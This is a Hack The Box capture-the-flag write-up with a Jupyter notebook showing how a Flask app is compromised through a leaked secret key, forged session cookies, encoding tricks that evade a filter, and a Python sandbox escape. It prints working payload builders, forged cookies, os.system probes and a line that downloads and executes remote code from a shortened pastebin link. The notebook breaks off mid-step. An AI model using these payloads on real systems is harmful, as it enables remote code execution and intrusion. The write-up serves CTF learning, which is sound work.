---
layout: post
title: Interdimensional Internet CTF (Hack The Box)
subtitle: Solution write-up and full exposure of strategy and tools  
date: 2020-10-12
categories: HTB
---

<div class="text-center">
<img src="https://i.ibb.co/kgv4Jz1/rm-jail-new.png" alt="cpu" border="0">
</div>


# Intro

The objective of this report is to show how we captured the flag for the **interdimensional internet** web challenge from Hack The Box.

 We have created a Github repository [here](https://github.com/gr0uch0dev/HTB_interdimensional_internet) hosting the write-up in the form of a Jupyter notebook. In the repository we have provided the entire environment in which we have worked while solving the challenge. Docker containers are made available to speed up replication of our attack.

## The Solution

Next we present the cookie that allowed us to get the flag.

Our instance is at: `167.172.53.64:30820`.

In order to get the flag we sent a `GET` request with a session cookie equal to:

```
.eJw9kctuozAARX9lxHoWxgRNW6mLQIDYaZwCtsHe8bDCw6YMMGlJlX8vq1lc6d6zvOfbaofrpOpWDYv18m39Kq0XSx7AgDPSy4zcZMQGTGN4WisttpDD_o_Mm63vW0GBrlak8Yp1OjSXYkjC1Kn_xsxOM3-ZT2DE3B4B19dbpsMdy5O-5PxdmXASWt8KvnfrPBkFlF4JY6e46x2N0I0eZEQNBwLIC40I5JTPLHoCte2t1E7OZXZdlcEry0lAAWkLuPsse2TXdugpPjbUIZTY_POcNbLIAic29a7uXUBzr017LGgWxiUIwIXyD5GPPufIqZgr2B2jMpSdCpYjOcpbqvkk4HO_sfeKxevJln5qkuOZcxFrBM4Ue2_3Jk-NCy5HrGkvYNk-d4kJh0IT983Rs-wah0UNKODXgNpqkv48IIObCjJIfDTidem3b1tlvkbRbvu-aBXxDkVBZz1-W0YV879Jmc3P_F8Q2r--Wo_HD6jwlO8.X4MZ2A._w1lmUCw-WGQWBZRXD2eAajo-Co
```
The flag was then found reaching the endpoint `/w`. A route that had been created by sending the application the above cookie.

In the following picture we show the result of sending a request with `curl` using such a cookie for the `session` value. We were able to retrieve the flag from the specified endpoint as the picture shows.

<img src="https://i.ibb.co/68yzmKm/flag-curl.png" alt="flag-curl" border="0">

The session cookie sent to the application holds a `base64` encode of the following payload:
```py
{u'measurements': ' ', u'ingredient': 'd=\'%cdecode\'%46+\'%c\'%40;exec "a=%s"%\'"eJxNjtEKwjAMRX+l+JIWZtVX/ZQxQtdmUOzakbYoiP9uticfAod7k9xLb/L6FNetcFNLcvU5lPo4wPrOTLmh2zbrQsDOCbkn0nB5wQAyZaOsS7Up1hYia7BgxvNtMpbJBXMaPoA495hazBUR7qNXS2HlVcxKG4voJUkcodlVOqD2+VBJdG1UXBR412A/8WJnt8reNF6n/cFagjSy/ylf8wPhtklg"\'+d+\'"base64")\'+d+\'"zlib")\';exec a#'}
```

That in turn has the `base64` encoded value of the `zlib` compression of what we wanted the target app to execute.
Following is the code that was evaluated by the application in the sandbox environment.

```py
exec("import flask,os;flask.current_app.add_url_rule('/w','w',open(os.listdir('.')[-1]).read)",{'__builtins__':[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__][0]()._module.__builtins__})
```
The idea we used is to recreate an `exec` with the `__builtins__` that were stripped in the first place. We got those using indirection with the following:
`[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__][0]()._module.__builtins__`

More about this can be found in the complete walk-through of our attack that we attach at the end of this post.

## Tools and Strategy
Although we have already presented the solution in the previous paragraph we now show the tools and the strategy used to achieve such a result.

During the attack the principal tools used were **Docker** and **Jupyter**. As it can be seen from the repository in which we have hosted our write-up.

As far as the strategy is concerned we started with an inspection of the html code for the index page. Here we saw a comment with an endpoint `/debug`. At such a URL we found the code of the application.

This was just the start of our journey.

From the source code found we saw that Flask had been used for the application.

It is always a good approach trying to recreate an infrastructural context similar to the one the target application is running into.

For this reason we created an environment using Docker and make the relevant experiments into such context.

We made some adjustments to the original code. Not having all the app sources at our disposal we made the functions entitled to render responses to instead give back strings. The aim here is knowing at least how the application logic works.

Next we present the write-up in its entirety. The reader that wants to interactively execute it can use the Github repository we have made available.



# THE COMPLETE WRITE-UP

## Preface

This notebook has the aim to show the steps that made us reach the flag in this Hack The Box challenge.

Since some of the cells require inputs from the user we suggest to run the notebook one cell at a time.

We are able to retrieve the source code of the application from the `/debug` endpoint.

A good strategy is to build the app also into our local network interface.

Our local app is running inside a docker container at address 173.17.0.3 on port 1337. We refer to this as **local app**. On the other hand when we refer to the remote instance from Hack The Box we say **HTB app**.

#### Configurations

Next are the global configurations on which this notebook rely.

We need the address of both the local and the HTB application. The secret key is used to sign the cookies that are going to be sent to the application. We find such a key inside the app source code.


```python
url_htb = "http://167.172.53.64:30820"
url_local = "http://173.17.0.3:1337" # from docker networking configuration
secret_key = "tlci0GhK8n5A18K1GTx6KPwfYjuuftWw"
```

### Initial Settings <a class="anchor" id="init-setting"></a>

In the following cell we create a procedure that is going to be used to choose which app we want to target. We can choose either our local instance or the one deployed on HTB.


```python
def get_url_to_target():
    choice = 0
    attempts = 0
    while choice not in [1,2]:
        if attempts>0: print("Option either 1 or 2 available")
        try:
            choice = input("1 for HTB, 2 for our local web server")
        except:
            print("Insert a number!")
        attempts+=1

    url = url_htb if choice == 1 else url_local
    print("Using the url: %s"%url)
    return url
```


```python
target_url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820


Send a request and evaluate the response


```python
import requests
from bs4 import BeautifulSoup
```


```python
out = requests.session().get(target_url)
bs_obj= BeautifulSoup(out.text,'lxml')
```

We have the body of the response


```python
print bs_obj
```

    <!DOCTYPE html>
    <html><head>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <meta content="makelaris" name="author"/>
    <title>🌌 on Venzenulon 9</title>
    <link crossorigin="anonymous" href="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet"/>
    <link href="//fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css"/>
    <style>html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}</style>
    </head>
    <body>
    <img class="mx-auto d-block img-responsive" src="//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif"/>
    <h1 style="font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;">4</h1>
    </body>
    <!-- /debug -->
    </html>


And the headers from where we can see if any cookie is used


```python
print out.headers
```

    {'Content-Length': '968', 'Set-Cookie': 'session=eyJpbmdyZWRpZW50Ijp7IiBiIjoiZW1Kc2NHWm1kR1pzY0E9PSJ9LCJtZWFzdXJlbWVudHMiOnsiIGIiOiJNVGt0TVRVPSJ9fQ.X4R6SA.Mc-HljAMXoiOTfqC4omzsNzlvDM; HttpOnly; Path=/', 'Vary': 'Cookie', 'Server': 'Werkzeug/1.0.1 Python/2.7.17', 'Date': 'Mon, 12 Oct 2020 15:46:16 GMT', 'Content-Type': 'text/html; charset=utf-8'}


A session cookie is set by the application. We inspect its value.

### Cookie inspection  <a class="anchor" id="cookie-inspection"></a>


```python
cookie_session = out.cookies['session']
print cookie_session
```

    eyJpbmdyZWRpZW50Ijp7IiBiIjoiZW1Kc2NHWm1kR1pzY0E9PSJ9LCJtZWFzdXJlbWVudHMiOnsiIGIiOiJNVGt0TVRVPSJ9fQ.X4R6SA.Mc-HljAMXoiOTfqC4omzsNzlvDM


This is the shape of the `secure cookie` used by Flask.

This type of a cookie is divided into parts, using a dot(`.`) as a separation marker.

The first part is the `base64` encoded value of the cookie's content.

The second one, still in `base64` encoding, is the timestamp.

The last one is the signature of the cookie. To sign it the app's secret key has been used.

The following is the decode of the first part of the cookie.
Recall that padding has to be respected.
Four chars in base64 are 24bits(3bytes). In the following we force the length of the encoded value to be a multiple of 4.


```python
encoded_cookie="eyJpbmdyZWRpZW50Ijp7IiBiIjoiYVdaaWIyMXpkVzFwZEE9PSJ9LCJtZWFzdXJlbWVudHMiOnsiIGIiOiJOVE10TVRVPSJ9fQ"
while len(encoded_cookie)%4:
    encoded_cookie+="="
decoded_cookie=encoded_cookie.decode('base64')
```


```python
print decoded_cookie
```

    {"ingredient":{" b":"aWZib21zdW1pdA=="},"measurements":{" b":"NTMtMTU="}}


We have found the structure of the cookie. Nonetheless the content is still base64 encoded.

Now, instead of decoding the values shown above we explore an other possible way to get the information we are looking for.

We can indeed get the value encoded inside the cookie using the procedures that are related to secure cookies construction in Flask.


```python
import hashlib
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer
```


```python
s = URLSafeTimedSerializer(
    secret_key, salt='cookie-session',
    serializer=session_json_serializer,
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
)
session_data = s.loads(out.cookies['session'])
```


```python
print session_data
```

    {u'measurements': '19-15', u'ingredient': 'zblpfftflp'}


These `ingredient` and `measurements` are the ones referred by the application to get the relevant data.
Indeed as we can see in the code found at the `/debug` endpoint the following assignments take place:
```
ingredient = session.get('ingredient', None)
measurements = session.get('measurements', None)
```

## Execute user defined code

In order to make the app process our data we have to create a cookie with the strucure just found and place it in the header of our request.

Inside the application source code we spot a call to a function that performs an `exec` of a string named `recipe`. Such a string could depend upon either the cookie provided or random values computed by the application. In order to make the former happen rather than the latter a specific condition has to take place. Namely `if ingredient and measurements and len(recipe) >= 20:` should evaluate to True.

Furthermore there are other conditions that need to be met in order for our cookie data to reach the so desired `exec`.
Also a regex test and the requirement of a length less than 300 charachters must be satisfied.

Notwithstanding, the `exec` statement occurs with a restricted environment:

`exec(statement,{'__builtins__':None},{})`

To summarize, we have to deal with:
<ul>
    <li> Regular expression. Unallowed chars like: (, [, _, . </li>
    <li> Length of recipe</li>
    <li> Restricted Environment</li>
</ul>

### Regular Expressions
In order to avoid the effect of regular expression we use a combination of `base64` encoding and string formatting.

According to the latter we can use the ASCII code of a char to format it into a string. For instace in order to use `(` in a string we could use the integer `40`.

`"Next is a left parenthesis: %c"%40` when printed results in `Next is a left parenthesis: (`

### Length of recipe

A constraint on the length of the object created from the data of the session cookie translates into careful attention on the length of the payload we provide to the application.

We use a compression library of the kind of `zlib` to deal with such a constraint.

### Restricted Environments

Although the app provides a sandboxed exec, there is a way we can use inderection to retrieve the `__builtins__` that the developer disallowed us to use.

The following code does indeed returns us the `__builtins__`:

`[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__`

Or, in order to consume less characters, we can use:

`[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__ ][0]()._module.__builtins__`

This means that the importing of a module into a sandboxed environment can occurs as in the following code



```python
pl = """
i=[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__ ][0]()._module.__builtins__['__import__']
os = i('os')
print os
"""
exec(pl,{'__builtins__':None},{})
```

    <module 'os' from '/usr/lib/python2.7/os.pyc'>


In this way we are able to get back the `__import__` function and load into the environment the desired value.

Another approach could be to use a **nested exec**. In the latter we are able to restore the builtins that were taken out by the outer exec. The following code shows how this could result in the same output as the above.


```python
pl = """
exec("import os;print os",{'__builtins__':[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__ ][0]()._module.__builtins__})
"""
exec(pl,{'__builtins__':None},{})
```

    <module 'os' from '/usr/lib/python2.7/os.pyc'>


We now have a way to build the payload to be sent to the application.

We create a procedure that transform a statment that we would normally use with `exec` into one that is consistent with a sandboxed environment.


```python
def make_a_statement_for_exec_consistent_with_sandbox(py_code):
    return """exec(\"""%s\""",{'__builtins__':[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__ ][0]()._module.__builtins__})"""%py_code
```

For instance if we want to `import os;print os` into a restricted environment like the one we are dealing with we would call the just wrote procedure.


```python
print make_a_statement_for_exec_consistent_with_sandbox("""import os;print os""")
```

    exec("""import os;print os""",{'__builtins__':[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__ ][0]()._module.__builtins__})


## Send cookies and check code execution

We now create a session cookie with a specific payload inside. The aim is to check if the application is executing the code we are sending.

Inside the payload we write an instruction to sleep in order to test if the application executes it.

Since we are dealing with constraints on length we use compression.

Following is a procedure that from a clear payload creates a statement that is intended to be executed by the restricted `exec` present in the application.


```python
def make_the_payload_using_base64_and_zlib(clear_pl):
    return """d='%cdecode'%46+'%c'%40;exec "a=%s"%'"{}"'+d+'"base64")'+d+'"zlib")';exec a#""".format(clear_pl.encode('zlib').encode('base64').replace('\n',''))
```


```python
code_to_sleep = """import time;time.sleep(5)"""
```

We see that the `code_to_sleep` includes a non-sandboxed code. Indeed we freely used the `import` statement.

We then make the code consistent with the sandbox using the ad-hoc procedure we created earlier.


```python
pl_sleep = make_a_statement_for_exec_consistent_with_sandbox(code_to_sleep)
print pl_sleep
```

    exec("""import time;time.sleep(5)""",{'__builtins__':[c for c in ().__class__.__base__.__subclasses__() if 'cat' in c.__name__ ][0]()._module.__builtins__})


Such payload is not sendable yet. We would get stopped by the regex control. We use the template and the encoding from the procedure we have written in the previous cells.


```python
print make_the_payload_using_base64_and_zlib(pl_sleep)
```

    d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjc0KAyEMhF8leFGhSC+9tI+yLEHTLAT8WVaFwtJ3r+6pl2GYL5nhD5NRSknay9GgSeLXFFcj824edrDbqRFDl9gkV0T9XAi2cgCBZDDWIVL0dZDhgq98mdrDlfLIjQXZQJNver7QwNmncQfrcl9nQyrvHtn9z3ztDxD7NPU="'+d+'"base64")'+d+'"zlib")';exec a#


Note the ending `#` of the previous payload. This comments any text that follows, avoiding the execution.

We now want to build the cookie that is going to be sent inside our http request.

The following procedure, from a payload intended to be executed in the app's `exec` environment, returns a secure cookie ready for Flask.


```python
from flask.sessions import URLSafeTimedSerializer, TaggedJSONSerializer
from itsdangerous import TimestampSigner

def from_payload_to_cookie_for_flask(pl_to_send, secret_key_flask, debug_recipe=False):

    cookie_for_session = {u'ingredient': pl_to_send, u'measurements': ' '}
    cookie_to_send = URLSafeTimedSerializer(
    secret_key = secret_key_flask,
    salt = 'cookie-session',
    serializer = TaggedJSONSerializer(),
    signer = TimestampSigner,
    signer_kwargs = {
        'key_derivation':'hmac',
        'digest_method':hashlib.sha1
        }
    ).dumps(cookie_for_session)
    if debug_recipe:
        recipe = '%s = %s' % (cookie_for_session['ingredient'], cookie_for_session['measurements'])
        print( "Recipe: " + recipe + "\nLEN RECIPE: " + str(len(recipe)))
    return cookie_to_send
```

Note that if the `debug_recipe` is set we are able to get info about the `recipe` string that will be computed by the application.


```python
evil_cookie = from_payload_to_cookie_for_flask(make_the_payload_using_base64_and_zlib(pl_sleep),secret_key,debug_recipe=True)
print "COOKIE FOR FLASK:\n%s"%evil_cookie
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjc0KAyEMhF8leFGhSC+9tI+yLEHTLAT8WVaFwtJ3r+6pl2GYL5nhD5NRSknay9GgSeLXFFcj824edrDbqRFDl9gkV0T9XAi2cgCBZDDWIVL0dZDhgq98mdrDlfLIjQXZQJNver7QwNmncQfrcl9nQyrvHtn9z3ztDxD7NPU="'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 250
    COOKIE FOR FLASK:
    .eJw90MtuozAYBeBXqVh3QUiZUSt1kdaX2FGMYmwI_w4wGi7GpYGW0CjvXlazONI5i7P5bl7j_l0q01Ru8l5u3kPhvXiAfMdT0UEqvoFqx9UpOCylzdYItPsL53rtuyZTvi0XZvnCbezqKO-Pc-yTUOrNh2zrETTscyLQ4cf6cTyFCicswde3BNXnpCfUbOXhuGUX4d7GY2dAoeQrx6eNslzlQVhXyu5hI6wiNZW9-IwQ8yGVi6T8qjvABbIu32Rzgmx2SrslCww62QFLYnjSzTOQAefUXCNVT7DnuKBwjNNBpmSQcRcGcGZbfTZRkYatTmH9z2FhSVg6YIY-hVUr_hgsnyQykSb6mTXlBd5Hx3pel4EOxDsb-DJ1q01T9dcha9b9M9mKJi2juPXuj15f5ePXpepX3_E_MNu9vnr3-y8AVoCd.X4R6Zg.Rl_riRR1LpLV6Cp_5SeK40cwlYo


We first try it on the app we are running locally.

The app that is running inside our Docker container has been augmented with some debug strings intended to be printed in the log of our webserver. In such a way we could get useful information in case of errors.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server2
    Using the url: http://173.17.0.3:1337


Send a `GET` request to the application using the just computed session cookie.


```python
out = requests.session().get(url,cookies={'session':evil_cookie})
bs_obj= BeautifulSoup(out.text,'lxml')
bs_obj
```




    <html><body><p>render_template('index.html')</p></body></html>



The app is sleeping! We have been able to execute the code in our payload.

The following picture is from the logging of our local application.

<img src="https://i.ibb.co/RjFnG8T/sleep-log.png" alt="sleep-log" border="0">

#### Bring in more abstraction to our approach

Let's abstract the procedure to send the cookies and retrieve the response body.


```python
def get_response_from_the_app_using_cookie(url_target,cookies=None):
    res = requests.session().get(url_target,cookies={'session':cookies})
    return BeautifulSoup(res.text,'lxml')
```


```python
get_response_from_the_app_using_cookie(url,evil_cookie)
```




    <html><body><p>render_template('index.html')</p></body></html>



Our local app sleeps. We need to check what happens to the one from HTB.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820


First without cookies.


```python
get_response_from_the_app_using_cookie(url)
```




    <!DOCTYPE html>\n<html><head>\n<meta content="width=device-width, initial-scale=1" name="viewport"/>\n<meta content="makelaris" name="author"/>\n<title>\U0001f30c on Venzenulon 9</title>\n<link crossorigin="anonymous" href="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet"/>\n<link href="//fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css"/>\n<style>html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}</style>\n</head>\n<body>\n<img class="mx-auto d-block img-responsive" src="//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif"/>\n<h1 style="font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;">112</h1>\n</body>\n<!-- /debug -->\n</html>



And then with them.


```python
get_response_from_the_app_using_cookie(url, evil_cookie)
```




    <!DOCTYPE html>\n<html><head>\n<meta content="width=device-width, initial-scale=1" name="viewport"/>\n<meta content="makelaris" name="author"/>\n<title>\U0001f30c on Venzenulon 9</title>\n<link crossorigin="anonymous" href="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet"/>\n<link href="//fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css"/>\n<style>html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}</style>\n</head>\n<body>\n<img class="mx-auto d-block img-responsive" src="//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif"/>\n</body>\n<!-- /debug -->\n</html>



**It sleeps!** The HTB app is executing our code!

#### Why sleeping is useful?

We can use it in a blind approach. For instance we can instruct the payload to sleep only if a test is successfull. If the app does indeed sleep it is an indication that what we wanted to test very likely holds. We use this technique in the following section.

## Pastebin

The presence of the limitation on the length of the payload make us think about a potential workaround: what if we use Pastebin?

The idea is to try to make the payload minimal enough to just retrieve and execute the malicious code that we host on a remote server.

For instance let's upload the sleep payload to Pastbin and use it. We increase the sleep time to 30 seconds.


```python
url_pastebin = "http://pastebin.com/raw/a5NuxPkx"
print url_pastebin
```

    http://pastebin.com/raw/a5NuxPkx


We shorten the link to take less space in the payload.


```python
url_bitly = "http://bit.ly/3iLzLda"
print url_bitly
```

    http://bit.ly/3iLzLda


Recall that we have a procedure to transform payloads for a sandboxed environment. Therefore we write the statement as we would do in case of a normal `exec`.


```python
pl_sleep_from_remote ="""import urllib as u;exec(u.urlopen('https://bit.ly/3iLzLda').read())"""
```

And then apply the transformation to make it execute in a restricted environment.


```python
pl_sleep_from_remote_sandbox = make_a_statement_for_exec_consistent_with_sandbox(pl_sleep_from_remote)
```

We compress and encode it in order to send!


```python
pl_sleep_remote_encoded = make_the_payload_using_base64_and_zlib(pl_sleep_from_remote_sandbox)
```


```python
evil_cookie = from_payload_to_cookie_for_flask(pl_sleep_remote_encoded,secret_key,debug_recipe=True)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjUsKwzAMRK8isrENxSl0l14hNwjByI5CBY4d/IF+6N3rZNXd8N5oRE9ysus63vaYCtTkPVvADPVOh6q6obhTkOJRyp6HvrdctH/1Nx7f44JC6US4SKXayuUjjLGVfeGQjRHD5GCNCRxwAKm0Mc5jbqYli5nOkKs9KTUuFfAKwmERx4lrOuDWejBP1/lY2OJSPen/N1/1A+fCQvQ="'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 290


Try it on the local app at first.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server2
    Using the url: http://173.17.0.3:1337



```python
get_response_from_the_app_using_cookie(url,evil_cookie)
```




    <html><body><p>render_template('index.html')</p></body></html>



It works for the local app. We test for HTB.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820



```python
get_response_from_the_app_using_cookie(url,evil_cookie)
```




    <!DOCTYPE html>\n<html><head>\n<meta content="width=device-width, initial-scale=1" name="viewport"/>\n<meta content="makelaris" name="author"/>\n<title>\U0001f30c on Venzenulon 9</title>\n<link crossorigin="anonymous" href="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet"/>\n<link href="//fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css"/>\n<style>html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}</style>\n</head>\n<body>\n<img class="mx-auto d-block img-responsive" src="//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif"/>\n</body>\n<!-- /debug -->\n</html>



In HTB **is not sleeping**. The response is indeed way faster than 30 seconds.

The treshold of 30 seconds is to avoid that any delay, due to a possible firewall or other mechanisms, could make us think that the code got executed correctly.

## OS commands

The next approach is to go hard and check if bash commands could be executed on the HTB machine.

Although not the best choice we use the `system` function of the `os` module to execute system commands. We prefer to use this library because of the short number of characters that are sufficient to run a command. We have to use as less space as possible.



```python
pl_sleep_bash = "import os;os.system('sleep 20')"
```

We compute the payload to be sent in the cookie.


```python
pl_sleep_bash_with_encoding = make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_sleep_bash))
```


```python
evil_cookie = from_payload_to_cookie_for_flask(pl_sleep_bash_with_encoding,secret_key,debug_recipe=True)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjc0KwyAQhF9l8bIKRUKP7aOEIGo3IPgTsgoNpe/eTU69DTPfzNCbolZKpbK1vUPjZ2PLB3cqGjkTbXCf0Ahx+6BzYaTcU2Xn8DFHWNsOEVIFbaxzMXuWRFTwTJfgES6XxNcG0goYfcezEiWuvggHyzwt50Jpr5HJ/t98zQ8m3jab"'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 254



```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server2
    Using the url: http://173.17.0.3:1337



```python
get_response_from_the_app_using_cookie(url,evil_cookie)
```




    <html><body><p>render_template('index.html')</p></body></html>



The local app sleeps.


```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820



```python
get_response_from_the_app_using_cookie(url,evil_cookie)
```




    <!DOCTYPE html>\n<html><head>\n<meta content="width=device-width, initial-scale=1" name="viewport"/>\n<meta content="makelaris" name="author"/>\n<title>\U0001f30c on Venzenulon 9</title>\n<link crossorigin="anonymous" href="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet"/>\n<link href="//fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css"/>\n<style>html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}</style>\n</head>\n<body>\n<img class="mx-auto d-block img-responsive" src="//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif"/>\n</body>\n<!-- /debug -->\n</html>



We are instantly blocked by the HTB application. The response is returned too soon.

But does this mean that we are not able to execut bash commands?

We try to use an other strategy.

The `os.system` commands returns the status code upon execution. In Unix machines such code is 0 if the execution is successfull.

Now we make sure that the system is running a Linux distro.

We use a simple strategy to achieve this. With the relevant Python code we get the name of the family of OS and make the app sleep if the result is `Linux`. In this way we know that if the app sleeps(using Python `os` library) the OS is indeed a Linux one.


```python
pl_check_linux = """import time, platform as p
if p.system()=='Linux': time.sleep(10)"""
```

We build the cookie and send it to the HTB app.


```python
evil_cookie = from_payload_to_cookie_for_flask(make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_check_linux)),secret_key,debug_recipe=True)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjU0KwyAQhfc9xZCNCkXSbSA36A1CEGMnMKBGMgoppXfvJKvuHu/ne3hg0F3XUSrbXqFSwjuU6Ou67Qk8Q7nRCsXymysmbcZRPSm3Qw1X13JELPrRG2HcP8q5pVGslNk5NUwBBAMBKIM21rkQPUsiavGMl+C2XC6Krw3ImQq+qnMSJM4+SQ/mqZ9PQtpeLaL9v/maHxSFQdo="'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 286



```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820



```python
get_response_from_the_app_using_cookie(url,evil_cookie)
```




    <!DOCTYPE html>\n<html><head>\n<meta content="width=device-width, initial-scale=1" name="viewport"/>\n<meta content="makelaris" name="author"/>\n<title>\U0001f30c on Venzenulon 9</title>\n<link crossorigin="anonymous" href="//stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet"/>\n<link href="//fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css"/>\n<style>html, body {background-image: url('//s-media-cache-ak0.pinimg.com/736x/7b/fe/d2/7bfed2ffe038beb673efd872cd44ba2c.jpg');} h1 {display: flex; justify-content: center; color: #6200ea; font-family: Comfortaa;}</style>\n</head>\n<body>\n<img class="mx-auto d-block img-responsive" src="//media3.giphy.com/media/eO8zgwAt3MVW/giphy.gif"/>\n</body>\n<!-- /debug -->\n</html>



The HTB app **sleeps**! This means that the host machine is running Linux!

We can use the same technique with sleep to get more information about the system. For instance if we want to find if a bash command can be executed the helper option `-h` could turn out usefull.

For instance if running `os.sysyem('apt-get -h)` results in a 0 exit code we know that the command is available and that, in this case, the package manager used is `apt`.

Say that we are interested in checking if `pip` is installed


```python
pl_check_pip = """import os,time
if os.system('pip -h')==0: time.sleep(10)
"""
```


```python
cookie_check_pip = from_payload_to_cookie_for_flask(make_the_payload_using_base64_and_zlib(make_a_statement_for_exec_consistent_with_sandbox(pl_check_pip)),secret_key,debug_recipe=True)
```

    Recipe: d='%cdecode'%46+'%c'%40;exec "a=%s"%'"eJxNjUEKgzAQRfeeYnCTBGywW8GTiISYjnQgMcGJ0FJ6946uunv8N38+vjDotm0plbxXyNxVStjQKmj5zRWTVoUK3J7KjGM/wOktR8Si771ppNt9lHPLQbHSxs6pYQqw5h0C0AbaWOdC9CxGaPGMF/CxXClKrg3IoAq+qrMSRG8+yR3MUz+fH1J+HBHt/8zX/ACWvT5N"'+d+'"base64")'+d+'"zlib")';exec a# =  
    LEN RECIPE: 278



```python
url = get_url_to_target()
```

    1 for HTB, 2 for our local web server1
    Using the url: http://167.172.53.64:30820



```python
get_response_from_the_app_using_cookie(url,cookie_check_pip)
```




